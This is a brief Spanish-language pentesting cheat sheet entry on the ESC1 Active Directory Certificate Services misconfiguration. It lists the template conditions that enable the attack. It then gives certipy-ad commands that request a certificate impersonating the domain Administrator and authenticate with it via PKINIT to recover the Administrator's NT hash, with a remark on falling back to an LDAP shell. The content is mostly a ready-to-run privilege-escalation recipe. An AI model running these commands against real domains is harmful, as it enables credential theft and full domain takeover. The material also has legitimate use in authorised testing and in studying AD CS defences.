ESC1

ESC1 aparece cuando una plantilla permite enrollee-supplied subject y autenticación de cliente con permisos de enrolamiento aprovechables.

Enrollee_Supplies_Subject + Client Authentication + Enrollment Permissions

ESC1 PoC

Solicitar un certificado como cualquier usuario del dominio y autenticarse vía PKINIT obteniendo su NT hash

# Solicitar Certificado como Administrator: Se genera administrator.pfx
certipy-ad req -u <user>@<domain.local> -p <pass> -ca <ca_name> -template <template_name> -upn administrator@<domain.local> -dc-ip <dc_ip>

# Autenticarse con el Certificado
certipy-ad auth -pfx administrator.pfx -domain <domain.local> -dc-ip <dc_ip>

# ENROLL Domain\Computers: Máquina Authority
# Error -> KDC_ERR_PADATA_TYPE_NOSUPP: Máquina Authority (acceder a LDAP shell)
